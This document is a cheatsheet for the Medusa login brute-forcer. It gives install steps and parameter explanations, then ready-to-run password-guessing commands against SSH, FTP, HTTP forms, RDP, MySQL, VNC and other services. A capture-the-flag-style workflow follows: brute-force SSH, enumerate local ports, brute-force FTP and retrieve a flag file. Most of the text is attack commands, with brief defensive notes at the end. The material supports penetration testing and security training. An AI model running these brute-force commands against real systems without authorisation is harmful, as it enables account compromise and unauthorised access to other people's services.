# Medusa Cheatsheet

Medusa is a fast, parallel, and modular login brute-forcer used to assess the resilience of login systems on remote authentication services.

## Installation

Check if installed:
medusa -h

Install (Debian/Ubuntu):
sudo apt-get -y update
sudo apt-get -y install medusa

## Command Syntax

medusa [target_options] [credential_options] -M module [module_options]

### Main Parameters

- -h HOST / -H FILE   : Single target hostname/IP, or file with host list
- -u USER / -U FILE   : Single username, or file with usernames
- -p PASS / -P FILE   : Single password, or file with passwords
- -M MODULE           : Module/service to use (ssh, ftp, http, etc)
- -m "OPTIONS"        : Module-specific parameters in quotes
- -t N                : Number of parallel login attempts (threads)
- -f / -F             : Stop after first success (host: -f, any: -F)
- -n PORT             : Custom port
- -v LEVEL            : Verbosity level (max 6)
- -e ns               : Test empty password (-e n) and password=username (-e s)

## Common Modules and Sample Usage

- FTP:    medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt
- HTTP:   medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^
- IMAP:   medusa -M imap -h mail.example.com -U users.txt -P passwords.txt
- MySQL:  medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt
- POP3:   medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt
- RDP:    medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt
- SSH:    medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt
- SVN:    medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt
- Telnet: medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt
- VNC:    medusa -M vnc -h 192.168.1.100 -P passwords.txt

Web form (HTTP POST login):
medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"

## Practical Example Scenarios

### SSH Brute-Force (User List & Password List)
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh

### Concurrent Brute-Force against Multiple Web Servers
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET

### Check for Empty/Default Passwords
medusa -h 10.0.0.5 -U usernames.txt -e ns -M <service>

### Brute-Force SSH with Custom Port and Limited Threads
medusa -h <IP> -n <PORT> -u user -P passwords.txt -M ssh -t 3

Finds the password and allows SSH login:
ssh user@<IP> -p <PORT>

### Brute-Force Local FTP
medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp -t 5

## Workflow for Realistic Scenario

1. Brute-force SSH to gain access:
   medusa -h <IP> -n <PORT> -u sshuser -P common_passwords.txt -M ssh -t 3

2. After login, check open services/ports:
   netstat -tulpn | grep LISTEN
   nmap localhost

3. Find FTP is open, brute-force FTP user:
   medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp -t 5

4. Log in and download target file:
   ftp ftp://ftpuser:<password>@localhost
   get flag.txt
   exit
   cat flag.txt

## Best Practices & Security Notes

- Always use strong, unique passwords per service.
- Brute-force tests are noisy: increased threads can trigger security systems.
- Consider lockout mechanisms and two-factor authentication to defend against such attacks.

---